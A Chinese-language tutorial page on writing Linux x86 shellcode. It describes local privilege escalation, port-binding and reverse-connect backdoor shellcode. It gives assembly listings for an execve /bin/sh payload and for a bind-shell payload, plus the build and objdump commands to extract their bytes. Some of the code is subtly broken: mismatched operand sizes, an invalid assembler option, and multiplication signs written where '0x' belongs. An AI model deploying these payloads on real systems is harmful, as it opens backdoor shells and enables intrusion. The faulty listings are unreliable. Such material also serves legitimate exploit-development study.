shellcode开发
========================================

linux下shellcode编写
----------------------------------------

基础
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 中断0×80方式
	::
	
		应用程序调用系统调用的过程是： 
		1.把系统调用的编号存入 EAX；
		2.把函数参数存入其它通用寄存器；
		3.触发 0x80 号中断（int 0x80）。

shellcode
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 分类
	- 本地提权: 获取root权限，通过系统调用setreuid
	- 执行shell ：执行执行/bin/sh ，通过系统调用  execve
	- 开启远程端口：用shellcode在目标计算机上打开一个端口(通讯服务)，并将Shell绑定到该端口，攻击者可以放弃入侵时的用的端口
	- 反向连接shellcode：当目标计算机在防火墙后时，防火墙不允许外边的计算机主动访问目标机器。所以即使采用上边的shellcode建立了服务后门，你还是不能与目标计算机建立连接。反向连接的含义就是，让目标计算机通过特定的IP(攻击者的)和端口反向连接到攻击者，也可以设定为在固定的时间段主动来建立连接。

+ 编写步骤
	- 编写出对应的C程序语言
	- 根据C语言反汇编或者直接编写C语言对应的汇编程序。
	- 调整汇编程序，减小shellcode体积，去掉可能存在的NULL字节。
	- 提取汇编语言对应的16进编码。

+ 示例
	-  /bin/sh shellocde（intel汇编写法)
		::
		
			xor eax,eax          eax=0
			push eax             eax=null
			push 0x68732f2f      压栈 //sh
			push 0x6e69622f      压栈 /bin
			mov ebx,esp          ebx=esp指向/bin/sh
			push eax             eax=null 结束栈null
			push ebx             参数2   ebx指向/bin/sh
			mov ecx,esp          参数3   ecx指向[“/bin/sh”,NULL]
			xor edx,edx          参数4  edx=NULL
			mov al,0xb           参数1  eax=0xb
			int 0x80  
			
			[root@0day linux]# nasm -f elf execve.asm  编写目标文件
			[root@0day linux]# ld -o execve execve.o   链接，生成可执行文件
			[root@0day linux]# objdump -d execve       获取16进制编码，提取shellcode
			
	- /bin/sh shellocde（AT&T汇编写法)
		::
		
			xorl   %eax,%eax
			pushl  %eax
			pushl  $0x68732f2f
			pushl  $0x6e69622f
			movl   %esp, %ebx
			pushl  %eax
			pushl  %ebx
			movl   %esp, %ecx
			xorl   %edx, %edx
			movb   $0xb, %eax
			int    $0x80

			[root@0day linux]# as -f elf execve2.asm     编写目标文件
			[root@0day linux]# ld -o execve2 execve2.o   链接，生成可执行文件
			[root@0day linux]# objdump -d execve2        获取16进制编码，提取shellcode
			
	- 端口绑定
		::
		
			xor    %eax,%eax
			xor    %ebx,%ebx
			xor    %ecx,%ecx
			push   %eax
			push   $0×1
			push   $0×2
			mov    %esp,%ecx
			inc    %bl
			mov    $0×66,%al
			int    $0×80
			mov    %eax,%esi
			push   %edx
			push   $0×8519ff02
			mov    %esp,%ecx
			push   $0×10
			push   %ecx
			push   %esi
			mov    %esp,%ecx
			inc    %bl
			mov    $0×66,%al
			int    $0×80
			push   %edx
			push   %esi
			mov    %esp,%ecx
			mov    $0×4,%bl
			mov    $0×66,%al
			int    $0×80
			push   %edx
			push   %edx
			push   %esi
			mov    %esp,%ecx
			inc    %bl
			mov    $0×66,%al
			int    $0×80
			mov    %eax,%ebx
			xor    %ecx,%ecx
			mov    $0×3f,%al
			int    $0×80
			inc    %ecx
			mov    $0×3f,%al
			int    $0×80
			inc    %ecx
			mov    $0×3f,%al
			int    $0×80
			push   %edx
			push   $0×68732f2f
			push   $0×6e69622f
			mov    %esp,%ebx
			push   %edx
			push   %ebx
			mov    %esp,%ecx
			mov    $0xb,%al
			int    $0×80

			[root@0day linux]# as -f elf bind.asm     编写目标文件
			[root@0day linux]# ld -o bind bind.o      链接，生成可执行文件
			[root@0day linux]# objdump -d bind        获取16进制编码，提取shellcode